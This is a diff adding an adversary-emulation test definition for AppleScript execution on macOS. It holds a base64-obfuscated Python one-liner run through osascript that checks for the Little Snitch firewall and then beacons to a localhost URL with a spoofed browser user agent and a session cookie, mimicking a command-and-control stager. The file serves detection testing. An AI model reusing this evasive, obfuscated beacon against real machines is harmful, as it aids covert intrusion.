@@ -1,0 +1,13 @@
+attack_technique: T1059.002
+display_name: "Command and Scripting Interpreter: AppleScript"
+atomic_tests:
+- name: AppleScript
+  auto_generated_guid: 3600d97d-81b9-4171-ab96-e4386506e2c2
+  description: |
+    Shell Script with AppleScript. The encoded Python 3 script will perform an HTTP GET request to 127.0.0.1:80 with a session cookie of "t3VhVOs/DyCcDTFzIKanRxkvk3I=", unless 'Little Snitch' is installed, in which case it will just exit.
+  supported_platforms:
+  - macos
+  executor:
+    command: |
+      osascript -e "do shell script \"echo \\\"import base64;exec(base64.b64decode('aW1wb3J0IHJlLHN1YnByb2Nlc3Msc3lzLHVybGxpYi5yZXF1ZXN0CmNtZD0icHMgLWVmIHwgZ3JlcCAnTGl0dGxlIFNuaXRjaCcgfCBncmVwIC12IGdyZXAiCm91dD1zdWJwcm9jZXNzLnJ1bihjbWQsc2hlbGw9VHJ1ZSxjYXB0dXJlX291dHB1dD1UcnVlLHRleHQ9VHJ1ZSkuc3Rkb3V0CmlmIHJlLnNlYXJjaCgiTGl0dGxlIFNuaXRjaCIsb3V0KTogc3lzLmV4aXQoKQpyZXE9dXJsbGliLnJlcXVlc3QuUmVxdWVzdCgiaHR0cDovLzEyNy4wLjAuMTo4MC9sb2dpbi9wcm9jZXNzLnBocCIpCnJlcS5hZGRfaGVhZGVyKCJVc2VyLUFnZW50IiwiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXT1c2NDsgVHJpZGVudC83LjA7IHJ2OjExLjApIGxpa2UgR2Vja28iKQpyZXEuYWRkX2hlYWRlcigiQ29va2llIiwic2Vzc2lvbj10M1ZoVk9zL0R5Q2NEVEZ6SUthblJ4a3ZrM0k9IikKb3BlbmVyPXVybGxpYi5yZXF1ZXN0LmJ1aWxkX29wZW5lcih1cmxsaWIucmVxdWVzdC5Qcm94eUhhbmRsZXIoKSkKb3BlbmVyLm9wZW4ocmVxLHRpbWVvdXQ9MykucmVhZCgpCg=='));\\\" | /usr/bin/python3 &\""
+    name: sh
